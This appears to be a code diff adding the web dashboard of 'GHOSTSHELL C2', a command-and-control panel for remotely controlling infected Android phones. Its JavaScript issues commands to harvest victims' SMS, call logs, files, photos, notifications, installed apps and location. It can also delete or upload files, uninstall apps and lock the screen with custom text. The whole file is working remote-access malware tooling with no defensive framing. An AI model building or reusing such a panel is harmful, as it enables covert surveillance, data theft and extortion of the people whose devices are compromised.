@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GHOSTSHELL C2</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-color: #0d0d0d;
+            --panel-bg: #1a1a1a;
+            --border-color: #00ff00;
+            --text-color: #e0e0e0;
+            --glow-color: rgba(0, 255, 0, 0.5);
+            --accent-color: #ff00ff;
+        }
+        body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Courier New', Courier, monospace; margin: 0; padding: 15px; }
+        .container { max-width: 1400px; margin: auto; display: grid; grid-template-columns: 250px 1fr; gap: 20px; }
+        .header { grid-column: 1 / -1; text-align: center; margin-bottom: 10px; }
+        .header h1 { color: var(--border-color); text-shadow: 0 0 10px var(--glow-color); }
+
+        .device-list-panel { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 15px; height: 80vh; overflow-y: auto; }
+        .device-list-panel h2 { border-bottom: 1px solid var(--accent-color); padding-bottom: 10px; margin-bottom: 10px; }
+        .device-item { padding: 10px; border-bottom: 1px solid #333; cursor: pointer; }
+        .device-item:hover, .device-item.active { background: var(--border-color); color: var(--bg-color); }
+        .device-item small { display: block; font-size: 0.8em; opacity: 0.7; }
+
+        .main-content { display: flex; flex-direction: column; }
+        .status-bar { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; }
+        .status-bar span { color: var(--accent-color); }
+        .main-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 15px; }
+        .grid-btn { background: var(--panel-bg); border: 1px solid var(--border-color); color: var(--border-color); padding: 15px; font-size: 0.9rem; cursor: pointer; transition: all 0.3s ease; text-align: center; }
+        .grid-btn:hover { background: var(--border-color); color: var(--bg-color); box-shadow: 0 0 15px var(--glow-color); }
+        .grid-btn:disabled { background: #111; color: #555; border-color: #444; cursor: not-allowed; }
+        .grid-btn i { display: block; font-size: 1.8rem; margin-bottom: 10px; }
+
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); }
+        .modal-content { background-color: var(--bg-color); margin: 5% auto; padding: 20px; border: 1px solid var(--border-color); width: 80%; max-width: 900px; height: 75vh; display: flex; flex-direction: column; }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--accent-color); padding-bottom: 10px; margin-bottom: 10px; }
+        .modal-title { color: var(--accent-color); font-size: 1.5rem; }
+        .modal-body { flex-grow: 1; overflow-y: auto; white-space: pre-wrap; word-break: break-word; font-size: 0.9em; }
+        .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
+
+        table { width: 100%; border-collapse: collapse; } th, td { padding: 8px; text-align: left; border-bottom: 1px solid #333; } th { color: var(--border-color); }
+        .action-btn { background: none; border: 1px solid var(--accent-color); color: var(--accent-color); cursor: pointer; margin: 2px; padding: 3px 6px; }
+
+        #gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; }
+        .gallery-item img { width: 100%; height: auto; cursor: pointer; border: 1px solid var(--border-color); }
+
+        #popup-overlay { position: fixed; top: 20px; right: 20px; background-color: var(--accent-color); color: var(--bg-color); padding: 20px; border: 2px solid var(--border-color); z-index: 2000; display: none; box-shadow: 0 0 20px var(--glow-color); max-width: 350px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1><i class="fas fa-user-secret"></i> GHOSTSHELL C2</h1>
+    </div>
+
+    <div class="device-list-panel">
+        <h2><i class="fas fa-satellite-dish"></i> Targets</h2>
+        <div id="device-list">No devices connected.</div>
+    </div>
+
+    <div class="main-content">
+        <div class="status-bar">
+            <div>Target: <span id="device-info">None Selected</span></div>
+            <div>Status: <span id="connection-status">-</span></div>
+        </div>
+
+        <div class="main-grid" id="main-grid-panel">
+            <!-- Buttons will be dynamically enabled/disabled -->
+        </div>
+    </div>
+</div>
+
+<div id="main-modal" class="modal"><div class="modal-content"><div class="modal-header"><h2 id="modal-title" class="modal-title"></h2><span class="close" onclick="closeModal()">&times;</span></div><div id="modal-body" class="modal-body"></div><div id="modal-footer" style="padding-top: 10px;"></div></div></div>
+<div id="popup-overlay"><h3><i class="fas fa-bell"></i> Alert</h3><p id="popup-content"></p></div>
+
+<script>
+let state = { devices: [], logs: [] };
+let selectedClientId = null;
+let currentModal = null;
+let popupTimeout;
+let flashOn = false;
+
+const mainGridPanel = document.getElementById('main-grid-panel');
+
+// API Communication
+async function sendCommand(cmd, body = {}) {
+    if (!selectedClientId) {
+        showPopup('error', 'No target selected.');
+        return;
+    }
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ cmd, client_id: selectedClientId, ...body })
+        });
+    } catch (e) { console.error('Error sending command:', e); }
+}
+
+// Core UI and State Management
+function selectDevice(clientId) {
+    selectedClientId = clientId;
+    flashOn = false; // Reset flash state on device switch
+    document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
+    document.getElementById(`device-${clientId.replace(/[:.]/g, '-')}`).classList.add('active');
+    updateMainDashboard();
+    closeModal();
+}
+
+function updateDeviceList() {
+    const deviceList = document.getElementById('device-list');
+    if (state.devices.length === 0) {
+        deviceList.textContent = 'No devices connected.';
+        selectedClientId = null;
+    } else {
+        deviceList.innerHTML = state.devices.map(dev => `
+            <div class="device-item" id="device-${dev.id.replace(/[:.]/g, '-')}" onclick="selectDevice('${dev.id}')">
+                <strong>${dev.model}</strong>
+                <small>${dev.id} | ${dev.battery}</small>
+            </div>
+        `).join('');
+
+        // Auto-select the first device if none is selected, or if the selected one disconnected
+        if (!selectedClientId || !state.devices.some(d => d.id === selectedClientId)) {
+            selectDevice(state.devices[0].id);
+        }
+    }
+    updateMainDashboard(); // Update buttons and status
+}
+
+function updateMainDashboard() {
+    const devInfo = document.getElementById('device-info');
+    const connStatus = document.getElementById('connection-status');
+
+    if (selectedClientId && state.devices.some(d => d.id === selectedClientId)) {
+        const device = state.devices.find(d => d.id === selectedClientId);
+        devInfo.textContent = device.info_str;
+        connStatus.textContent = 'ONLINE';
+        connStatus.style.color = 'var(--border-color)';
+        mainGridPanel.innerHTML = getGridButtonsHtml(true);
+    } else {
+        devInfo.textContent = 'None Selected';
+        connStatus.textContent = 'OFFLINE';
+        connStatus.style.color = 'red';
+        mainGridPanel.innerHTML = getGridButtonsHtml(false);
+    }
+}
+
+function getGridButtonsHtml(enabled) {
+    const disabledAttr = enabled ? '' : 'disabled';
+    return `
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('sms')"><i class="fas fa-sms"></i>SMS</button>
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('calls')"><i class="fas fa-phone-alt"></i>Call Logs</button>
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('filemanager')"><i class="fas fa-folder-open"></i>File Manager</button>
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('gallery')"><i class="fas fa-images"></i>Gallery</button>
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('notifications')"><i class="fas fa-bell"></i>Notifications</button>
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('apps')"><i class="fas fa-th-large"></i>Apps</button>
+        <button class="grid-btn" ${disabledAttr} onclick="openModal('toast')"><i class="fas fa-window-maximize"></i>Screen Lock</button>
+        <button class="grid-btn" ${disabledAttr} id="flash-btn" onclick="toggleFlash()"><i class="fas fa-bolt"></i>Flash OFF</button>
+        <button class="grid-btn" ${disabledAttr} onclick="sendCommand('get_location')"><i class="fas fa-map-marker-alt"></i>Location</button>
+    `;
+}
+
+// Modal & Dynamic Content
+function openModal(modalType) {
+    if (!selectedClientId) { showPopup('error', 'Select a target device first.'); return; }
+    currentModal = modalType;
+    document.getElementById('main-modal').style.display = 'block';
+    document.getElementById('modal-title').textContent = modalType.charAt(0).toUpperCase() + modalType.slice(1);
+    renderModalContent();
+    fetchInitialDataForModal(modalType);
+}
+
+function closeModal() {
+    if (currentModal === 'notifications') sendCommand('exit');
+    document.getElementById('main-modal').style.display = 'none';
+    currentModal = null;
+}
+
+function fetchInitialDataForModal(modalType) {
+    const commands = { sms: 'getsms', calls: 'getcalllogs', filemanager: 'filemanager', gallery: 'gallery', apps: 'list_app', notifications: 'notifikasi' };
+    if (commands[modalType]) sendCommand(commands[modalType]);
+}
+
+async function renderModalContent() {
+    const body = document.getElementById('modal-body');
+    const footer = document.getElementById('modal-footer');
+    body.innerHTML = 'Loading...';
+    footer.innerHTML = '';
+
+    if (!selectedClientId) { body.innerHTML = 'No client selected.'; return; }
+    const response = await fetch(`/api/client_data/${selectedClientId}`);
+    const clientData = await response.json();
+    if (clientData.error) { body.innerHTML = 'Error fetching client data.'; return; }
+
+    switch(currentModal) {
+        case 'sms':
+            body.innerHTML = '<table><thead><tr><th>Sender</th><th>Message</th></tr></thead><tbody>' +
+                (clientData.sms_logs || []).map(log => `<tr><td>${log.userSender}</td><td>${log.content}</td></tr>`).join('') + '</tbody></table>';
+            break;
+        case 'calls':
+            body.innerHTML = '<table><thead><tr><th>Number</th><th>Date</th><th>Duration</th><th>Type</th></tr></thead><tbody>' +
+                (clientData.call_logs || []).map(log => `<tr><td>${log.number}</td><td>${log.date}</td><td>${log.duration_seconds}s</td><td>${log.call_type}</td></tr>`).join('') + '</tbody></table>';
+            break;
+        case 'filemanager':
+            footer.innerHTML = `<input type="file" id="file-upload-input" style="display:none;"><button onclick="document.getElementById('file-upload-input').click()">Upload</button><input type="text" id="fm-input" placeholder="e.g., new_name.txt" style="width: 50%;"><button onclick="handleFmAction('rename')">Rename</button>`;
+            const fmData = clientData.file_manager;
+            let filesHtml = `<p>Current Path: <span>${fmData.path || '/'}</span></p><table><thead><tr><th>Name</th><th>Type</th><th>Actions</th></tr></thead><tbody><tr><td colspan="3"><a href="#" onclick="sendCommand('cd ..')">.. (Up)</a></td></tr>`;
+            filesHtml += (fmData.files || []).map(file => {
+                const name = file.name;
+                return file.isDirectory ? `<tr><td><a href="#" onclick="sendCommand('cd ${name}')"><i class="fas fa-folder"></i> ${name}</a></td><td>Folder</td><td></td></tr>` :
+                    `<tr><td><i class="fas fa-file"></i> ${name}</td><td>File</td><td><button class="action-btn" onclick="sendCommand('get ${name}')">Download</button><button class="action-btn" onclick="handleFmAction('delete', '${name}')">Delete</button></td></tr>`;
+            }).join('');
+            body.innerHTML = filesHtml + '</tbody></table>';
+            document.getElementById('file-upload-input').onchange = (e) => { if (e.target.files.length) uploadFile(e.target.files[0], fmData.path); };
+            break;
+        case 'gallery':
+            footer.innerHTML = `<button onclick="sendCommand('gallery back')">Back</button><span>Page: ${clientData.gallery?.page || 0}</span><button onclick="sendCommand('gallery next')">Next</button>`;
+            body.innerHTML = '<div id="gallery-grid">' + (clientData.gallery?.files || []).map(file => `<div class="gallery-item"><img src="/gallery_images/${file.name}" alt="${file.name}" onclick="viewImage('${file.name}')"/><p style="font-size: 0.7rem; text-align: center;">${file.name}</p></div>`).join('') + '</div>';
+            break;
+        case 'notifications':
+            body.innerHTML = '<table><thead><tr><th>App</th><th>Title</th><th>Text</th></tr></thead><tbody>' + (clientData.notifications || []).map(n => `<tr><td>${n.packageName}</td><td>${n.title}</td><td>${n.text}</td></tr>`).join('') + '</tbody></table>';
+            footer.innerHTML = '<button onclick="closeModal()">Stop Listening</button>';
+            break;
+        case 'apps':
+            body.innerHTML = '<table><thead><tr><th>App Name</th><th>Package Name</th><th>Actions</th></tr></thead><tbody>' + (clientData.apps || []).map(app => `<tr><td>${app.appName}</td><td>${app.packageName}</td><td><button class="action-btn" onclick="sendCommand('run ${app.packageName}')">Run</button><button class="action-btn" onclick="uninstallApp('${app.packageName}')">Uninstall</button></td></tr>`).join('') + '</tbody></table>';
+            break;
+        case 'toast':
+             body.innerHTML = '<p>Enter text to display on the locked screen.</p>';
+             footer.innerHTML = `<input type="text" id="toast-text" placeholder="Your text here..." style="flex-grow: 1;"><button onclick="sendToast()">Lock Screen</button><button onclick="sendCommand('toast off')">Unlock</button>`;
+             break;
+    }
+}
+
+// Actions
+function handleFmAction(action, fileName) {
+    const input = document.getElementById('fm-input');
+    if (action === 'rename') {
+        const selectedFile = prompt('Which file to rename?');
+        if (selectedFile && input.value) sendCommand(`rename ${selectedFile} ${input.value}`);
+    } else if (action === 'delete' && confirm(`Are you sure you want to delete ${fileName}?`)) {
+        sendCommand(`del ${fileName}`);
+    }
+}
+function uninstallApp(pkg) { if(confirm(`Are you sure you want to request uninstall for ${pkg}?`)) sendCommand(`uninstall ${pkg}`); }
+function sendToast() { const text = document.getElementById('toast-text').value; if (text) sendCommand(`toast on ${text}`); }
+function toggleFlash() {
+    flashOn = !flashOn;
+    sendCommand(flashOn ? 'flashon' : 'flashoff');
+    document.getElementById('flash-btn').innerHTML = `<i class="fas fa-bolt"></i>Flash ${flashOn ? 'ON' : 'OFF'}`;
+    document.getElementById('flash-btn').style.color = flashOn ? 'yellow' : 'var(--border-color)';
+}
+function showPopup(type, message) {
+    const popup = document.getElementById('popup-overlay');
+    document.getElementById('popup-content').innerHTML = message;
+    popup.style.display = 'block';
+    if (popupTimeout) clearTimeout(popupTimeout);
+    popupTimeout = setTimeout(() => { popup.style.display = 'none'; }, 8000);
+}
+
+// Main Polling Loop
+async function pollStatus() {
+    try {
+        const response = await fetch('/api/status');
+        const data = await response.json();
+        state = data; // Update global state
+
+        updateDeviceList();
+
+        // Check for popups like notifications or location for the selected device
+        if (selectedClientId) {
+            const clientDataResponse = await fetch(`/api/client_data/${selectedClientId}`);
+            const clientData = await clientDataResponse.json();
+            if (clientData.location_url) {
+                showPopup('location', `Location received: <a href="${clientData.location_url}" target="_blank">Open Map</a>`);
+                // Maybe clear this on the server or track viewed state on client?
+            }
+             // Simple notification check - could be improved
+            if (clientData.notifications && clientData.notifications.length > 0) {
+                 const latestNotif = clientData.notifications[0];
+                 // A simple check to avoid re-showing old popups. Could be more robust.
+                 if (!document.body.innerHTML.includes(latestNotif.text)) {
+                    showPopup('notification', `<strong>${latestNotif.title}</strong><br>${latestNotif.text}`);
+                 }
+            }
+        }
+
+        if (currentModal) {
+            renderModalContent();
+        }
+
+    } catch (e) {
+        console.error('Polling error:', e);
+        document.getElementById('connection-status').textContent = 'ERROR';
+        document.getElementById('connection-status').style.color = 'red';
+    }
+    setTimeout(pollStatus, 2500); // Poll slightly less frequently
+}
+
+window.onload = () => {
+    updateMainDashboard();
+    pollStatus();
+};
+window.onclick = (event) => { if (event.target == document.getElementById('main-modal')) closeModal(); };
+</script>
+</body>
+</html>
